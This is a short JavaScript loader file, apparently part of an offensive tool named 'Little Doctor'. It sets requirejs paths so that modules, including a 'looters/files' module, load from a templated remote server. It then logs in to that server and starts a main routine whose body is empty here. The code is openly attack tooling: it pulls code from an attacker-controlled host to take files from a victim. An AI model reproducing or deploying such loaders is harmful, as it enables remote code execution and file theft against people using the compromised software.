/*
 *  This file determines what looter modules get loaded
 */

var scheme = '__LITTLE_DOCTOR_SCHEME__://';
var hostname = '__LITTLE_DOCTOR_HOSTNAME__:__LITTLE_DOCTOR_LISTEN_PORT__';
var server = scheme + hostname;


requirejs.config({
    paths: {
        filesystem: server + '/modules/filesystem',
        utils: server + '/modules/utils',
        platform: server + '/modules/platform',

        // Loot modules
        lootFiles: server + '/modules/looters/files'
    }
});


function main() {
    console.log('Little Doctor is examining the patient ...');
    requirejs(['utils', 'filesystem'], function (utils, fs) {


    });
}

requirejs(['utils'], function(utils) {
    utils.GET('/login', {
        success: main,
        failure: function() {
            console.error('Failed to login to server');
        }
    });
});